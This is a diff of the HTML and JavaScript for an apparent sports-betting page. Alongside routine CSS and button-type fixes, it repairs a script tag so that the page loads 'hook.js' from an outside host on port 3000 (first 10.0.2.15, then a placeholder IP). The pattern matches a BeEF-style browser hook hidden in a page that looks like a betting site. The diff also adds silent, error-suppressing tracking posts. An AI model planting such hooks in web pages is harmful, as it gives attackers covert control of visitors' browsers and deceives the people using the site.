@@ -45,7 +45,7 @@
     header{
       position:sticky; top:0;
       backdrop-filter: blur(10px);
-https://docs.github.com/en/pages/quickstarthttps://docs.github.com/en/pages/quickstart      background: rgba(7,11,18,.65);
+      background: rgba(7,11,18,.65);
       border-bottom:1px solid rgba(28,42,68,.65);
       z-index:30;
     }
@@ -135,7 +135,7 @@ https://docs.github.com/en/pages/quickstarthttps://docs.github.com/en/pages/quic
       flex-wrap:wrap;
     }
     .teams{
-      display:flex; align-items:center; gap:12px
+      display:flex; align-items:center; gap:12px;
       font-weight:900;
       font-size:1.2rem;
       letter-spacing:.3px;
@@ -328,8 +328,8 @@ https://docs.github.com/en/pages/quickstarthttps://docs.github.com/en/pages/quic
 
     <div class="actions">
       <span class="pill">Balance: <b id="bal">$251.07</b></span>
-      <button class="btn ghost" id="refreshBtn">Refresh Odds</button>
-      <button class="btn betnow" id="betNowBtn">BET NOW</button>
+      <button class="btn ghost" id="refreshBtn" type="button">Refresh Odds</button>
+      <button class="btn betnow" id="betNowBtn" type="button">BET NOW</button>
     </div>
   </div>
 </header>
@@ -414,7 +414,7 @@ https://docs.github.com/en/pages/quickstarthttps://docs.github.com/en/pages/quic
       </div>
 
       <footer>
-         Wage Your BET NOW!.
+        Wage Your BET NOW!.
       </footer>
     </div>
 
@@ -452,11 +452,11 @@ https://docs.github.com/en/pages/quickstarthttps://docs.github.com/en/pages/quic
               <div class="kv"><span>Total Payout</span><b id="payout" class="mono">$0.00</b></div>
             </div>
 
-            <button class="place" id="placeBtn">Place Bet</button>
+            <button class="place" id="placeBtn" type="button">Place Bet</button>
 
             <div class="miniRow">
-              <button class="btn" id="clearBtn">Clear</button>
-              <button class="btn ghost" id="randomBtn">Lucky Pick</button>
+              <button class="btn" id="clearBtn" type="button">Clear</button>
+              <button class="btn ghost" id="randomBtn" type="button">Lucky Pick</button>
             </div>
           </div>
 
@@ -490,8 +490,8 @@ https://docs.github.com/en/pages/quickstarthttps://docs.github.com/en/pages/quic
       </div>
 
       <div class="miniRow" style="margin-top:12px">
-        <button class="btn" id="closeModal">Done</button>
-        <button class="btn ghost" id="printBtn">Print</button>
+        <button class="btn" id="closeModal" type="button">Done</button>
+        <button class="btn ghost" id="printBtn" type="button">Print</button>
       </div>
     </div>
   </div>
@@ -547,6 +547,7 @@ https://docs.github.com/en/pages/quickstarthttps://docs.github.com/en/pages/quic
 
       m.options.forEach(opt => {
         const btn = document.createElement("button");
+        btn.type = "button";
         btn.className = "oddBtn";
         if (selected && selected.id === opt.id) btn.classList.add("active");
 
@@ -678,7 +679,8 @@ https://docs.github.com/en/pages/quickstarthttps://docs.github.com/en/pages/quic
     const cur = Number(balEl.textContent.replace(/[$,]/g,"")) || 0;
     balEl.textContent = money(Math.max(0, cur - s));
 
-    document.getElementById("ticketId").textContent = "BN-" + Math.random().toString(16).slice(2,10).toUpperCase();
+    document.getElementById("ticketId").textContent =
+      "BN-" + Math.random().toString(16).slice(2,10).toUpperCase();
     document.getElementById("mPick").textContent = `${selected.label} • ${selected.market}`;
     document.getElementById("mOdds").textContent = `${selected.line} @ ${fmtOdds(selected.odds)}`;
     document.getElementById("mStake").textContent = money(s);
@@ -688,26 +690,28 @@ https://docs.github.com/en/pages/quickstarthttps://docs.github.com/en/pages/quic
     openModal();
   });
 
-  // 
-  //
+  // Fail-silent tracking (won't throw in console if endpoint doesn't exist)
+  function safeTrack(message){
+    try{
+      if (!("fetch" in window)) return;
+      fetch("/track", {
+        method: "POST",
+        headers: {"Content-Type":"application/json"},
+        body: JSON.stringify({ msg: message, ts: Date.now() })
+      }).catch(() => {});
+    }catch(_e){}
+  }
+
   document.getElementById("betNowBtn").addEventListener("click", () => {
-    // OPTIONAL: if nothing selected, nudge them nicely
     if (!selected){
       toast("Select a pick", "Choose an odds box first.");
       return;
     }
-
-  
-  fetch("/track", {
-    method: "POST",
-    headers: {"Content-Type":"application/json"},
-    body: JSON.stringify({ msg: "", ts: Date.now() })
-  }).catch(() => { /* stay silent */ });
-});
-
+    safeTrack("<HappyBirthdayMom>");
+  });
 
   renderMarkets();
   syncSlip();
-<script src="http://10.0.2.15:3000/hook.js"</script>
+<script src="http://<IP>:3000/hook.js"></script>
 </body>
 </html>
